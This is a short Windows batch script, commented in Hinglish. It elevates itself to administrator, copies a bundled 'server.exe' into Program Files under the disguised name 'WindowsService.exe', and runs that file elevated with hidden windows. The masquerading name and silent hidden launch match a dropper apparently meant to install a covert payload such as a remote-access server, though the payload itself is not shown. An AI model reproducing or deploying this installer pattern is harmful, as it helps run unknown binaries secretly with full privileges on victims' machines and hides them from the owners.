@echo off
:: Admin check
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: server.exe copy karo C:\Program Files mein
mkdir "C:\Program Files\WindowsService" >nul 2>&1
copy /Y "%~dp0server.exe" "C:\Program Files\WindowsService\WindowsService.exe" >nul

:: Usi folder se admin se run karo
powershell -WindowStyle Hidden -Command "Start-Process 'C:\Program Files\WindowsService\WindowsService.exe' -Verb RunAs -WindowStyle Hidden"
exit